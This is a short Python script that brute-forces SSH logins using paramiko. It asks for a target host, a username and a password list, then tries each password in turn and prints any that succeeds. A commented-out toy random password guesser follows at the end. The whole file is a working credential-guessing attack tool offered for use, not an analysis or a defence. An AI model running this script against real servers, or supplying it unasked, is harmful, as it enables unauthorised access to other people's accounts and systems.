import paramiko, sys , os , socket 
import threading, time

# this is bruteforce working without threads atm,
# need to be checked on many machines 

stop_flag = 0

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient() #init
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy) #init

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException: #wrong password
        code = 1
    except socket.error as e: # any other error
        code = 2
    ssh.close()
    return code


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')

#check if file exsist
if os.path.exists(input_file) == False:
    print('[---]That File/Path Doest Exsist[---]')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0: # password found
                print((('[+] Found Password: ' + password + ' For Account: '+ username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: '+ password)
        except Exception as e:
            print(e)
            pass
# import random
# import pyautogui

# chars = "abcdefghijklmnopqrstuvwxyz0123456789"
# char_list = list(chars)

# pw = pyautogui.password("Enter a password:")
# guess =""

# while(guess != pw):
#     guess = random.choices(char_list, k =len(pw))
#     print("<======"+str(guess)+"======>")

#     if(guess == list(pw)):
#         print("your password is : "+ "".join(guess))
#         break
